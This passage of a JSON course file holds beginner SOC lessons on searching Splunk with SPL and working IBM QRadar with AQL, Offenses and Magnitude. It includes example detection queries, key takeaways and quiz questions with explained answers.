      "content": "Now that 'SIEM' means something, we can be precise about Splunk. **Splunk** is a platform that ingests machine data (logs, events, metrics) from across an environment, stores it, and makes it searchable. Used as a SIEM, it becomes the place a SOC centralises its telemetry — the word 'telemetry' just means 'the data machines send back about what they're doing' — and hunts through it.\n\n### The one-sentence mental model\n\n**Everything gets shipped into Splunk, and you ask questions of all of it from one search bar.** A domain controller's logon events, a Palo Alto firewall's traffic, CrowdStrike's endpoint alerts, AWS cloud activity — all of it flows into Splunk, and you query it from a single box using one language.\n\n### Why 'search-first' matters\n\nSplunk is what we call a **search-first** tool: you are handed a search bar and you go find things. This is different from some other SIEMs (like QRadar) that hand you a pre-built list of incidents to work. Neither is better; they are different styles. Splunk's style means the core skill — the thing you do hundreds of times a day — is **writing a search**. That is why this lesson spends most of its time teaching you to search, and why an analyst's fluency in Splunk is really fluency in its search language.\n\n### What analysts actually do in Splunk all day\n\n- **Investigate an alert**: something fired; you search Splunk to find the surrounding events and figure out what really happened.\n- **Hunt**: you have a hunch (\"did anyone run PowerShell from a Word document this week?\") and you search to test it.\n- **Build detections**: you take a search that reliably finds something bad and save it so Splunk runs it automatically forever.\n- **Report**: you build dashboards so the team can see the state of things at a glance.\n\nAll four are searching. So let's learn to search — starting with *where the data lives*, because you can't search a pile until you know how the pile is organised."
    },
    {
      "heading": "Where the Data Lives: Index, Source, and Sourcetype",
      "content": "When all those logs pour into Splunk, they don't land in one undifferentiated heap — they are organised, and knowing the organisation makes your searches fast and precise. Three labels matter.\n\n### Index — the named bucket\n\nData in Splunk is stored in **indexes**. An index is just a **named bucket of data** — a big labelled container. A company might have `index=windows` for Windows logs, `index=firewall` for firewall logs, `index=cloud` for cloud activity, and a default `index=main`. When you search, you almost always start by naming the bucket: `index=windows`. This tells Splunk *which pile to look in*, so it doesn't waste time reading buckets that can't contain your answer. (Analogy: a library with rooms labelled 'History', 'Science', 'Fiction'. You don't search the whole building; you go to the right room first.)\n\n### Source — where the event came from\n\nEvery event also remembers its **source** — literally where it came from, usually a file path or input, like `/var/log/secure` or a specific network input. You use it less often than index, but it's there when you need to pin down one exact origin.\n\n### Sourcetype — the KIND of data\n\nThe **sourcetype** is the most useful of the three after index. It labels the *kind* of data, so Splunk knows how to read its structure. Examples: `WinEventLog:Security` (Windows Security log), `pan:traffic` (Palo Alto firewall traffic), `linux_secure` (Linux auth log). Two firewalls from the same vendor share a sourcetype even if they're different machines. Naming the sourcetype narrows your search to exactly the *type* of record you want.\n\n### Putting it together\n\nSo a typical search *opens* like this:\n\n```\nindex=windows sourcetype=WinEventLog:Security\n```\n\nRead it as: *look in the Windows bucket, and only at Windows Security-log records.* You have already, in five words, told Splunk to ignore 99% of the data and focus on the slice that could hold your answer. This is the single most important habit for speed: **always scope by index (and usually sourcetype) first.** A search with no index reads everything and is slow; a scoped search is fast. Everything you add after this only refines a pile that is already small."
    },
    {
      "heading": "The Search Bar and the Time Picker",
      "content": "With the data organised, let's actually run a search. In Splunk you type a query into the **search bar** — a single text box at the top of the Search app — and press enter. Splunk goes through the events in the buckets you named and returns the ones that match, newest first, in a scrolling list. That's it: type a question, get matching events.\n\n### The time picker — the control beginners forget\n\nRight next to the search bar is the **time range picker** — a dropdown where you choose *how far back to look*: Last 15 minutes, Last 24 hours, Last 7 days, or a custom window. This little control matters enormously, and forgetting it is the number-one beginner mistake.\n\nHere is why. The *same* search over 'All time' might grind through months of data and take minutes; the same search over 'Last 60 minutes' returns almost instantly. And relevance follows time: if you're investigating an alert that fired at 09:14 today, searching 'Last 7 days' buries your answer in a week of noise, while a tight window around 09:14 shows exactly the events that matter.\n\n**The rule: always set the time window to the incident you're investigating.** Start narrow (the hour around the alert), and widen only if you need more context. A precise search over a tight window is the difference between an answer in two seconds and a spinning wheel.\n\n### A first search, start to finish\n\nSuppose you want failed logins in the last hour. You would:\n\n1. Set the time picker to **Last 60 minutes**.\n2. Type into the search bar: `index=windows sourcetype=WinEventLog:Security EventCode=4625`\n3. Press enter.\n\nSplunk returns every failed-logon event (4625 is the Windows code for a failed logon) from the last hour. You are now looking at real events. But a raw list of events is only the start — the power comes from *transforming* that list, which needs one more concept first: fields."
    },
    {
      "heading": "Fields: Turning Text Into Questions",
      "content": "A raw event is a line of text. To ask sharp questions, Splunk breaks each event into **fields** — named pieces of the event you can filter and group on. This is the idea that turns keyword-searching into real analysis, so it's worth getting clearly.\n\n### What a field is\n\nA field is a **name-and-value pair pulled out of the event**. In a Windows logon event, Splunk extracts fields like `user=d.rosen`, `src_ip=10.14.22.108`, `EventCode=4625`, `action=failure`. The messy log line becomes a set of tidy labelled values you can point at.\n\n### Filtering on a field: field=value\n\nInstead of searching for a word, you search for a field having a value: `EventCode=4625`. Compare the two approaches:\n\n- A **bare keyword** search — typing just `failed` — finds *every* event that contains the word 'failed' anywhere, including \"backup failed\", \"failed to load font\", and thousands of irrelevant lines.\n- A **field** search — `EventCode=4625` — finds *exactly* the failed-logon events, because you asked for a precise field value, not a word that might appear anywhere.\n\nThis precision is the whole game. `user=administrator`, `action=blocked`, `dest_port=3389` — each is a surgical filter. You can stack them: `index=windows EventCode=4625 user=administrator` means *failed logons, for the administrator account, only.*\n\n### Where fields come from\n\nSome fields Splunk extracts automatically (like `_time`, the event's timestamp, and `host`, the machine that produced it). Others come from the sourcetype knowing that vendor's format. You don't have to create them for common data — they're just *there*, and clicking the 'Fields' sidebar in Splunk shows you which fields the current search has and their common values.\n\n### Why this unlocks everything\n\nOnce events have fields, you can not only *filter* by them but *group and count* by them — \"how many failed logons per user?\", \"how many bytes per destination?\". That grouping is where investigations are actually solved, and it's done with the pipe, which is next. Hold on to this: **a field is a labelled value inside an event, `field=value` filters precisely, and fields are what the rest of SPL operates on.**"
    },
    {
      "heading": "SPL Step by Step: The Pipe",
      "content": "**SPL — the Search Processing Language** — is how you ask Splunk questions, and its single most important idea is the **pipe**, written as a vertical bar: `|`.\n\n### What a pipe even is\n\nIf you've never used a command line, 'pipe' sounds intimidating; it isn't. A pipe means **'take the results from the left and feed them into the command on the right'**. It's an assembly line: results flow left to right, and each station (command) does one job to them before passing them along. `A | B | C` means: run A, hand its results to B, hand B's results to C. That's the whole concept.\n\n### The two halves of every search\n\nEvery SPL search has two parts, split at the first pipe:\n\n1. **The base search** (everything *before* the first `|`) — this *retrieves* raw events from the index, scoped by index/sourcetype and `field=value` filters. This is the only part that actually reads the stored data.\n2. **The pipeline** (each `| command` *after*) — this *transforms* what the base search returned: filtering further, grouping, counting, sorting, formatting.\n\n### Read a real one as a sentence\n\n```\nindex=windows sourcetype=WinEventLog:Security EventCode=4625\n| stats count by user, src_ip\n| where count > 20\n| sort - count\n```\n\nLine by line:\n\n- `index=windows ... EventCode=4625` — *get the failed-logon events* (the base search).\n- `| stats count by user, src_ip` — *count them, grouped by each user + source-IP pair* (turns thousands of events into a small table of counts).\n- `| where count > 20` — *keep only pairs with more than 20 failures* (filter the table).\n- `| sort - count` — *sort with the highest count first* (the minus means descending).\n\nThe result is a short, ranked table: the user/IP pairs hammering the login the hardest. That's a brute-force detection, built from four readable lines.\n\n### Why order matters (filter early, transform late)\n\nBecause each stage feeds the next, *order changes speed and meaning*. Put your most selective filters in the **base search** so only a little data flows down the pipeline — that's fast. If instead you retrieve everything and filter at the end, Splunk hauls the whole pile first, which is slow. The professional habit is simple: **filter early, transform late.** Get the smallest useful set of events with the base search, then shape it with `stats`/`sort`/etc. Once you can read a pipeline top-to-bottom as a sentence, almost any SPL query becomes legible."
    },
    {
      "heading": "The SPL Commands You Use Every Shift",
      "content": "You do not need all of SPL — it's a big language, but a dozen commands cover the overwhelming majority of SOC work. Here they are with plain descriptions.\n\n| Command | What it does (in plain terms) |\n|---------|-------------------------------|\n| `search` / `where` | Keep only events/rows that match a condition (`where` allows maths and comparisons like `count > 20`) |\n| `stats` | The workhorse: count and summarise, grouped by fields — `stats count by user` |\n| `table` | Show only the columns you name, in the order you name them |\n| `sort` | Order the results (`sort - count` = biggest first) |\n| `dedup` | Remove duplicate rows, keeping one per value |\n| `top` / `rare` | The most / least common values of a field |\n| `eval` | Make a new field or transform one (e.g. compute the hour of day from a timestamp) |\n| `rex` | Pull a new field out of raw text using a pattern (regex) |\n| `timechart` | Count or summarise *over time* — for trend graphs |\n| `lookup` | Enrich events against a side table (e.g. match an IP to a threat-intel list) |\n| `rename` / `fields` | Rename a column / keep or drop columns |\n\n### The two you'll reach for most\n\n**`stats` is your workhorse.** Most investigations end in `stats count by <something>`, which collapses thousands of raw events into a short ranked table you can actually reason about. \"How many failed logons per user?\" → `stats count by user`. \"How many bytes to each destination?\" → `stats sum(bytes_out) by dest_ip`. If you learn one command deeply, make it this one.\n\n**`timechart` answers 'when'.** It's `stats` but bucketed over time, which draws a line graph. This instantly separates *beaconing* (malware phoning home on a schedule looks like a flat, perfectly regular line) from normal human activity (bursty and irregular).\n\n### A worked example, explained\n\nFind the top external destinations one host talked to (an exfiltration-hunting shape):\n\n```\nindex=firewall sourcetype=pan:traffic src_ip=10.14.22.108 action=allowed\n| stats sum(bytes_out) as bytes_out by dest_ip\n| sort - bytes_out\n| head 10\n```\n\n- Base search: *allowed outbound traffic from one host* (scoped tight).\n- `stats sum(bytes_out) as bytes_out by dest_ip`: *add up the bytes sent to each destination* (`as bytes_out` just names the resulting column).\n- `sort - bytes_out`: *biggest sender first.*\n- `head 10`: *keep the top ten rows.*\n\nOne host, its ten biggest outbound destinations by data volume — exactly what you'd check if you suspected data was being stolen. Notice the pattern that repeats across all SOC searches: **scope tight, then `stats` to a small table, then `sort`/`head` to the outliers.**"
    },
    {
      "heading": "Common SOC Searches You Can Read and Adapt",
      "content": "Here are searches for situations a Tier-1/Tier-2 analyst hits constantly. Each is written to be *read* — base search plus pipeline — and adapted to your environment's index and field names.\n\n### Brute force that then succeeded\n\n```\nindex=windows EventCode=4625\n| stats count as failures, values(_time) as times by user, src_ip\n| where failures > 20\n```\n\nThis finds user+IP pairs with many failed logons. The crucial follow-up: check whether that *same* `user`+`src_ip` then produced a **4624** (a *successful* logon) shortly after. Many failures followed by one success is a brute force that **worked** — a likely compromise, and a much bigger deal than failures alone.\n\n### Suspicious process ancestry (a malicious document)\n\n```\nindex=edr sourcetype=Sysmon EventCode=1 ParentImage=\"*\\\\WINWORD.EXE\" Image=\"*\\\\powershell.exe\"\n| table _time, host, User, ParentImage, Image, CommandLine\n```\n\nSysmon Event Code 1 is 'a process started'. This asks for cases where the *parent* process was Word and the *child* was PowerShell — Word has no legitimate reason to launch PowerShell, so this is the classic signature of a malicious macro in a phishing document. `table` then shows just the useful columns.\n\n### Beaconing to a destination\n\n```\nindex=firewall dest_ip=203.0.113.44\n| timechart span=1m count\n```\n\n`timechart span=1m count` counts connections per one-minute bucket and graphs it. Malware phoning home looks like a **flat, regular line** (the same small count every minute); real human traffic is bursty and uneven. The *shape* is the tell.\n\n### Rare, first-seen values\n\n```\nindex=proxy\n| rare limit=20 dest_domain\n```\n\n`rare` shows the *least* common values — here, the 20 least-visited domains. Attacker command-and-control domains are usually rare (visited by one infected host a handful of times), while the top domains are just normal business sites, so the rare list is often where the interesting things hide.\n\n### The pattern under all of them\n\nEvery search above does the same three things: **retrieve narrowly**, then **`stats`/`timechart`/`rare` to expose an anomaly**, then read the small result. You are almost never scrolling raw events one by one; you are aggregating thousands of them into a compact table or graph where the outlier stands out. Internalise that shape and you can write your own searches for situations these examples don't cover."
    },
    {
      "heading": "From Search to Detection: Alerts, Dashboards & Enterprise Security",
      "content": "A search you run by hand helps you once. The real power of Splunk in a SOC is turning good searches into *automatic* detection and shared views, so a hunt you did today keeps catching the same thing forever.\n\n### Saved searches and alerts\n\nAny SPL search can be **saved** (given a name and kept) and **scheduled** to run on a timer — say, every 5 minutes. When you attach a **trigger condition** — 'alert if the search returns any results', or 'if failures > 50' — it becomes a **scheduled alert**. When it fires, it can email the team, open a ticket, or run an automated action. This is exactly how a one-time hunt becomes a standing detection: you write the query, confirm it's precise (few false positives), then save it as an alert so Splunk runs it for you around the clock.\n\n### Dashboards\n\nSaved searches also power **dashboards** — pages of charts and tables (built from `timechart`, `stats`, and friends) that give a live, at-a-glance view: failed logons over time, top talkers, blocked connections by country. Analysts open a dashboard at the start of a shift to gauge the state of the environment before diving into individual alerts. A dashboard is just several saved searches, drawn as panels, refreshing on their own.\n\n### Splunk Enterprise Security and Notable Events\n\nMany SOCs run **Splunk Enterprise Security (ES)**, a premium app that adds a full security workflow on top of plain Splunk. Its core ideas:\n\n- **Correlation searches** — pre-built and custom SPL searches that run continuously looking for threats. (A 'correlation search' is just a scheduled SPL search whose job is detection.)\n- **Notable Events** — when a correlation search matches, it creates a **Notable Event**: a triageable alert in the ES **Incident Review** queue, carrying a severity, an owner, and a status (new / in-progress / resolved). This queue is the ES analyst's inbox — the list of things to work.\n- **Risk-Based Alerting (RBA)** — instead of alerting on every small signal, ES adds up 'risk' against a user or host over time, and raises a notable when the accumulated risk crosses a line. This catches slow attacks that no single event would trip.\n\n### How it all ties together\n\nHere is the full loop, using everything in this lesson: raw logs from everywhere are **collected into indexes**; **correlation searches** (written in SPL) run against them continuously; a match becomes a **Notable Event** that an analyst picks up in **Incident Review**; the analyst then **pivots back into ad-hoc SPL searches** to investigate — scoping by index and time, filtering on fields, aggregating with `stats`, checking `timechart` for beaconing — and finally decides to escalate, contain, or close. Splunk is, in the end, one search language wrapped in a detection-and-triage workflow. Master SPL — the pipe, the fields, `stats`, `timechart` — and you are effective everywhere in it, from the first raw search to the final incident decision."
    }
  ],
  "keyTakeaways": [
    "The foundations first: a log is a machine's diary of its activity, one line is an event, and a SIEM (Security Information and Event Management) collects everyone's logs into one searchable place — Splunk is that place for a SOC, and 'using Splunk' means searching that pile.",
    "Data is organised by index (a named bucket, e.g. index=windows), source, and sourcetype (the KIND of data) — always scope by index/sourcetype first and set a tight time range in the time picker, because that is what makes a search fast and relevant.",
    "Fields are labelled values pulled from each event; filtering with field=value (EventCode=4625) is precise where a bare keyword is not, and fields are what you group and count on.",
    "SPL is built on the pipe (|), an assembly line where a base search retrieves events and each | command transforms them — read it top-to-bottom as a sentence, filter early/transform late, and lean on the two workhorses: stats (thousands of events → a ranked table) and timechart (exposes beaconing).",
    "Good searches become detection: save + schedule them as alerts, build dashboards from stats/timechart, and in Splunk Enterprise Security correlation searches raise Notable Events in an Incident Review queue (plus Risk-Based Alerting) — then analysts pivot back into ad-hoc SPL to investigate and decide."
  ],
  "quiz": [
    {
      "question": "A brand-new analyst is told Splunk is 'the SIEM'. In one sentence, what does a SIEM fundamentally do, and why does a SOC need one?",
      "options": [
        {
          "label": "It is antivirus software installed on each laptop that blocks malware locally, so the SOC needs one on every endpoint to stop infections.",
          "value": "a"
        },
        {
          "label": "It collects logs (event records) from machines all across the environment into one central, searchable place, so an analyst can investigate activity spread across many devices from one search bar.",
          "value": "b"
        },
        {
          "label": "It is a firewall that sits at the network edge and allows or blocks connections, so the SOC needs one to keep attackers out of the network entirely.",
          "value": "c"
        },
        {
          "label": "It is a ticketing system that assigns work to analysts, so the SOC needs one purely to track who is handling which task during a shift.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A SIEM (Security Information and Event Management) centralises logs from across the whole environment into one searchable place, so an analyst can investigate activity that is spread across many machines without visiting each one — which is exactly what Splunk provides for a SOC. Option a describes antivirus/EDR, a different control. Option c describes a firewall. Option d describes a ticketing/case system. Only option b captures the collect-everything-and-search-it purpose of a SIEM."
    },
    {
      "question": "You want to find, in the Windows Security log, source IPs that produced more than 20 failed logons. Which SPL query is correct AND efficient, and why?",
      "options": [
        {
          "label": "index=windows EventCode=4625 | stats count by src_ip | where count > 20 — it filters to failed logons in the base search first, then aggregates and thresholds the smaller result set (filter early, transform late).",
          "value": "a"
        },
        {
          "label": "index=windows | stats count by src_ip | where EventCode=4625 — it aggregates every Windows event first and applies the EventCode filter at the very end, which is the accurate order.",
          "value": "b"
        },
        {
          "label": "count > 20 | src_ip | EventCode=4625 index=windows — SPL reads right to left, so the index and event filters must appear last in the pipeline.",
          "value": "c"
        },
        {
          "label": "index=windows EventCode=4625 | table src_ip — a table command is required because stats cannot group events by a field like src_ip.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The efficient query filters to EventCode=4625 in the base search so only failed logons are retrieved, then uses stats count by src_ip and where count > 20 on that small set — the filter-early, transform-late habit. Option b is wrong because once stats aggregates the data, EventCode is gone so you cannot filter on it, and reading all events first is slow. Option c reverses SPL's left-to-right order. Option d is wrong because stats can group by a field, and table only chooses columns, it does not count."
    }
  ],
  "references": [
    "https://docs.splunk.com/Documentation/Splunk/latest/SearchTutorial/WelcometotheSearchTutorial",
    "https://docs.splunk.com/Documentation/Splunk/latest/Search/Aboutthesearchlanguage",
    "https://docs.splunk.com/Documentation/ES/latest/User/Howurworkswithnotableevents"
  ],
  "xp": 240,
  "estimatedMinutes": 55,
  "researchUsed": false,
  "createdAt": "2026-08-16T00:00:00.000Z"
},
{
  "id": "topic-lesson-ibm-qradar-for-soc-analysts",
  "slug": "ibm-qradar-for-soc-analysts",
  "title": "IBM QRadar for SOC Analysts: Offenses, AQL, and Log Activity",
  "topic": "SIEM",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "IBM QRadar is one of the enterprise SIEMs a SOC analyst is most likely to sit in front of, and it works quite differently from a search-bar tool like Splunk. This lesson assumes no prior QRadar experience and defines terms as it goes. We start with what QRadar is doing at all, then how it takes in and normalises data, the tabs you work in, its query language AQL step by step with real queries, and — the heart of QRadar — how Offenses and their Magnitude turn raw logs into a prioritised list of incidents you triage.",
  "sections": [
    {
      "heading": "Start Here: What Problem QRadar Solves",
      "content": "If you have not read a SIEM lesson before, one idea comes first. Every machine writes **logs** — text records of what it did — and one record is an **event** (\"user signed in at 09:14\"). A large company produces millions of events a day, scattered across thousands of devices. A **SIEM** (Security Information and Event Management) collects all those logs into one place and makes sense of them.\n\n**IBM QRadar** is a SIEM, and it has a distinctive personality. Where a search-first tool hands you a blank search box, QRadar's whole design is built to **do the first pass of correlation for you**: it takes the flood of raw events, and using rules it groups the related, suspicious ones into a small number of prioritised **Offenses** — its word for 'an incident worth an analyst's attention'.\n\nThink of the difference like this. A search-first SIEM is a library where you walk in and start looking things up. QRadar is a library that has *already* pulled the handful of books it thinks you need and stacked them on your desk, sorted by importance — and you can still go to the shelves yourself when you want. That 'already sorted a short stack for you' behaviour is QRadar's defining trait, and everything in this lesson builds toward understanding how that short stack (the Offense queue) is produced and worked. Keep it in mind as we go."
    },
    {
      "heading": "What QRadar Ingests: Events, Flows, and Normalisation",
      "content": "Before QRadar can correlate anything, it has to take data in and make it uniform. Two kinds of data come in, and one crucial step tidies them up.\n\n### Events and flows\n\n- **Events** are **log records from devices**: a Windows logon, a firewall deny, an EDR alert. Each event is one discrete thing that happened — the same 'event' idea from any SIEM.\n- **Flows** are **network conversation records** — who talked to whom, on what port, how much data, for how long — captured from network taps or NetFlow. The key point: a flow exists even when *no device wrote a log*. If two machines talk and neither logs it, the flow still records that the conversation happened. Flows give QRadar visibility that logs alone would miss.\n\nEvents live under the **Log Activity** tab; flows under **Network Activity**. Having both is what lets QRadar tie 'this logon' (an event) to 'this network conversation' (a flow).\n\n### DSMs and normalisation — the tidying step\n\nHere is a real problem: every vendor writes logs in its own format. Cisco calls the source address one thing, Palo Alto calls it another, Windows a third. If the fields have different names, you can't search across them together.\n\nQRadar solves this with **DSMs — Device Support Modules**. A DSM is a **parser for one vendor's format**: it reads that vendor's messy log and **normalises** it — rewrites it into QRadar's single common schema. After normalisation, a username is always `username`, a source address is always `sourceip`, and the *type* of event is a **QID** (QRadar Identifier — a number that stands for 'this kind of event', like 'Failed Login'), no matter which vendor it came from. This normalisation is the quiet hero of QRadar: it's why one query language can search Cisco, Palo Alto, and Windows data together.\n\n### The architecture in one breath\n\nA QRadar deployment has a **Console** (the web UI and the correlation brain), **Event/Flow Processors** (that collect and store the data), and the **Ariel** database (where events and flows are stored and queried). You won't administer these as an analyst, but the names appear in the UI — and knowing data lives in **Ariel** explains why the query language is called **AQL** (Ariel Query Language). The whole pipeline: messy multi-vendor data comes in → DSMs normalise it → it's stored in Ariel → rules correlate it into Offenses. The next sections walk that last part, which is where you live."
    },
    {
      "heading": "The Interface: Log Activity, Network Activity, and Offenses",
      "content": "QRadar's screen is organised into **tabs**, and an analyst spends the day moving between three of them. Learning which tab answers which question is the first practical skill.\n\n### Offenses — where you start your day\n\nThe **Offenses** tab is the analyst's queue — the 'short stack of books on your desk'. An **Offense** is QRadar's correlated incident: a bundle of related events/flows that its rules decided is worth attention. Each Offense shows a **Magnitude** (its priority — more on this later), an **offense type**, and lists of **sources** (the attackers / where it came from), **destinations** (the targets), and the contributing events. You work Offenses **top-down by Magnitude** — highest first. This is the opposite of a search-first tool: your day begins with QRadar's own prioritised incidents, not a blank query box.\n\n### Log Activity — the raw events\n\nThe **Log Activity** tab shows the raw, normalised **events** flowing in near-real-time, and it's where you drill down once an Offense sends you looking. Two features make it fast without writing any query:\n\n- **Quick Filter** — a free-text search box for fast keyword filtering across events (type an IP or a username and it filters).\n- **Right-click to filter** — click any value in a result (an IP, a user) and choose to add it to your filter or pivot to related data. This click-driven narrowing is how analysts go from thousands of events to the relevant handful *without* writing AQL.\n\nWhen you need a precise, aggregated question the clicks can't express, you switch Log Activity to run an **AQL** query (next section).\n\n### Network Activity — the flows\n\nThe **Network Activity** tab is the same idea for **flows** (network conversations) — showing traffic volume and who talked to whom, even where no log exists. You come here to answer 'how much data left, and to where?'.\n\n### The core loop\n\nDashboards (the **Dashboard** tab) hold live widgets, and any Log/Network Activity search can be saved and reused. But the loop that defines a QRadar shift is simple: **open an Offense → pivot into Log Activity (and Network Activity) to see its events → filter down (quick-filter, right-click, or AQL) to understand what happened → decide.** Get comfortable moving between the Offenses queue and the activity tabs and you already have the shape of the job."
    },
    {
      "heading": "AQL Step by Step",
      "content": "**AQL — the Ariel Query Language** — is QRadar's language for querying events and flows precisely. The good news for a beginner: **it looks like SQL**, the classic database query language, so if you've ever seen a database query it will feel familiar — and if you haven't, its structure is very readable in plain English.\n\n### The shape of an AQL query\n\n```\nSELECT sourceip, username, COUNT(*) AS failures\nFROM events\nWHERE qid = 5000023\nGROUP BY sourceip, username\nHAVING failures > 20\nORDER BY failures DESC\nLAST 1 HOURS\n```\n\nRead it top to bottom — each clause is a plain instruction:\n\n- **`SELECT`** — *which fields (and totals) to show me.* Here: the source IP, the username, and a count I'll call 'failures'.\n- **`FROM events`** — *which dataset*, events or flows. (Use `FROM flows` for network conversations.)\n- **`WHERE`** — *the filter*: only rows matching this condition. Here, only events whose QID is the 'failed login' id.\n- **`GROUP BY`** — *collapse rows that share these fields into one*, so COUNT counts per group. Here, one row per source-IP + username.\n- **`HAVING`** — *filter the grouped results* (like WHERE but after grouping). Keep only groups with more than 20 failures.\n- **`ORDER BY ... DESC`** — *sort*, biggest first.\n- **`LAST 1 HOURS`** — *the time window.* This trailing time clause is distinctive to AQL and is **required** to bound how far back the query looks.\n\nThat one query finds source-IP/username pairs with more than 20 failed logons in the last hour — a brute-force detector, in readable clauses.\n\n### Two helper functions you'll use constantly\n\nBecause data is normalised, some things are stored as numbers, and two functions decode them into names:\n\n- **`QIDNAME(qid)`** — turns the numeric event id into its human name (e.g. `QIDNAME(qid)` → 'Failed Login'). You use it so results are readable and so you can filter by name.\n- **`LOGSOURCENAME(logsourceid)`** — turns the numeric log-source id into the device's name.\n\nSo a friendlier failed-logon hunt reads:\n\n```\nSELECT LOGSOURCENAME(logsourceid) AS device, sourceip, username, COUNT(*) AS failures\nFROM events\nWHERE QIDNAME(qid) ILIKE '%failed%login%'\nGROUP BY sourceip, username\nORDER BY failures DESC\nLAST 24 HOURS\n```\n\n(`ILIKE` is a case-insensitive text match, and `%` means 'anything', so `'%failed%login%'` matches any event name containing 'failed' then 'login'.) The mental model to lock in: **AQL is SQL over normalised security data, with a trailing time window, using QIDNAME/LOGSOURCENAME to turn numeric ids into names.**"
    },
    {
      "heading": "Common SOC AQL Queries and Fields",
      "content": "Here are AQL queries for everyday SOC questions, each readable clause by clause, plus the fields that make them work.\n\n### Everyday queries\n\n**Top talkers (possible data exfiltration):**\n\n```\nSELECT sourceip, destinationip, SUM(sourcebytes) AS bytes_out\nFROM flows\nWHERE sourceip = '10.14.22.108'\nGROUP BY destinationip\nORDER BY bytes_out DESC\nLAST 24 HOURS\n```\n\n*From network flows, for one host, add up the bytes it sent to each destination, biggest first.* This is the shape you'd run if you suspected data was leaving a machine.\n\n**All authentication activity for one user:**\n\n```\nSELECT starttime, sourceip, QIDNAME(qid) AS event, LOGSOURCENAME(logsourceid) AS device\nFROM events\nWHERE username = 'j.smith'\nORDER BY starttime DESC\nLAST 7 DAYS\n```\n\n*Every event for this user over a week, newest first, with readable event and device names.* Ideal for reconstructing what an account did.\n\n**Denied connections to a suspect IP:**\n\n```\nSELECT sourceip, destinationip, destinationport, COUNT(*) AS hits\nFROM events\nWHERE destinationip = '203.0.113.44'\nGROUP BY sourceip, destinationport\nLAST 6 HOURS\n```\n\n*Who tried to reach this suspicious IP, on which ports, how many times.*\n\n### The fields you'll use most\n\n| Field / function | What it holds (plain terms) |\n|------------------|------------------------------|\n| `sourceip` / `destinationip` | The IP addresses involved (from / to) |\n| `sourceport` / `destinationport` | The ports = which service |\n| `username` | The normalised user account |\n| `qid` / `QIDNAME(qid)` | The event's type id / its human name |\n| `logsourceid` / `LOGSOURCENAME()` | The device that logged it |\n| `magnitude` | The event's calculated importance |\n| `starttime` | When the event happened |\n| `sourcebytes` / `destinationbytes` | Bytes in a flow (for exfil sizing) |\n\n### The habit that keeps AQL fast\n\nAs with every SIEM query language, **filter and bound tightly**: a specific `WHERE`, specific fields, and the smallest sensible `LAST N` window. AQL over 'LAST 30 DAYS' with no `WHERE` is slow and noisy; the same query scoped to one IP over 'LAST 6 HOURS' returns fast. And when you find an AQL query that reliably surfaces something bad, it becomes the seed of a **rule** — so QRadar catches it automatically and raises an Offense next time, which is the final piece."
    },
    {
      "heading": "Offenses and Magnitude: How QRadar Correlates and You Triage",
      "content": "The feature that *defines* QRadar is the **Offense**, and understanding how one is born and how it's prioritised is the heart of using the tool.\n\n### From raw events to an Offense\n\nQRadar runs **rules** (in its Rule Engine) continuously against every incoming event and flow. A **rule** is just a saved condition — for example: 'more than 20 failed logins from one source in 10 minutes, then a success', or 'any communication with a known-bad IP', or 'a new administrator account was created'. When a rule's conditions are met, QRadar **creates or updates an Offense**, automatically attaching the contributing events, the **sources** (attackers), the **destinations** (targets), and a category. So instead of you correlating scattered raw logs by hand, the rules do that first pass and hand you a ready-made incident. This is the 'short stack on your desk' from the first section, made concrete.\n\n### Magnitude — how Offenses are ranked\n\nEvery Offense carries a **Magnitude**, QRadar's single priority score, and it is computed from three ingredients:\n\n- **Severity** — *how damaging* the activity would be if real.\n- **Credibility** — *how confident* QRadar is that it's real (one lone source is less credible than several corroborating ones).\n- **Relevance** — *how important the affected asset is* (an alert on a domain controller matters more than the same alert on a disused test box).\n\nMagnitude combines these three so you can **work the queue top-down** — highest Magnitude first — instead of treating every alert as equally urgent. And it's tunable: telling QRadar which of your servers are high-value (high relevance) is how a SOC makes Magnitude reflect *real business risk*, not just raw event counts.\n\n### The analyst's triage loop\n\nPutting the entire lesson together, a QRadar shift looks like this:\n\n1. **Open the Offenses tab**, sorted by Magnitude — start with the most urgent.\n2. **Open an Offense** to read its summary: which rule fired, the sources and destinations, and the timeline of contributing events.\n3. **Pivot into Log Activity / Network Activity** on the offending IPs and users — using quick-filter, right-click, or an **AQL** query — to see exactly what happened and work out the scope (did it spread? what did it touch?).\n4. **Decide**: escalate, contain, or close as a false positive — and set the Offense's status and owner so the team knows it's handled.\n5. If the investigation revealed a gap, **turn the AQL that found it into a rule**, so QRadar raises an Offense automatically next time.\n\nThe defining difference from a search-first SIEM is this: QRadar starts you at **correlated, prioritised incidents** (Offenses ranked by Magnitude) and lets you drill down into the raw events with AQL — rather than starting you at an empty search bar. Master this Offense → AQL → decide loop and you can work a QRadar SOC queue with confidence."
    }
  ],
  "keyTakeaways": [
    "Foundations first: logs are machines' records of activity, one record is an event, and a SIEM collects them all into one place; QRadar is a SIEM whose defining trait is doing the first correlation FOR you — grouping related events into a short, prioritised list of Offenses instead of handing you a blank search box.",
    "QRadar ingests events (device logs, under Log Activity) and flows (network conversations, under Network Activity — visible even when nothing logged), and DSMs normalise every vendor's format into one schema (sourceip, username, QID) stored in the Ariel database.",
    "You work three tabs: Offenses (the prioritised queue you start from), Log Activity (raw events — quick-filter and right-click to pivot, or run AQL), and Network Activity (flows); the loop is open an Offense → drill into events → decide.",
    "AQL is SQL over normalised data with a trailing time window — SELECT ... FROM events/flows WHERE ... GROUP BY ... ORDER BY ... LAST N HOURS — using QIDNAME(qid) and LOGSOURCENAME(logsourceid) to turn numeric ids into names; always filter tightly and bound the time.",
    "Rules correlate events/flows into Offenses, each scored by Magnitude = severity × credibility × relevance, so analysts work the queue top-down; the triage loop is Offense → pivot with AQL → decide → turn good queries into rules."
  ],
  "quiz": [
    {
      "question": "What most fundamentally distinguishes how a SOC analyst starts their day in QRadar versus a search-bar SIEM, and why?",
      "options": [
        {
          "label": "In QRadar you must write an AQL query before seeing any data, because QRadar has no correlation engine and never groups related events together.",
          "value": "a"
        },
        {
          "label": "QRadar starts you at prioritised Offenses — correlated incidents its rules already built and scored by Magnitude — rather than at an empty search bar, so you triage ready-made incidents first.",
          "value": "b"
        },
        {
          "label": "QRadar only stores network flows and no device logs, so an analyst can never investigate a Windows logon or a firewall event within the tool.",
          "value": "c"
        },
        {
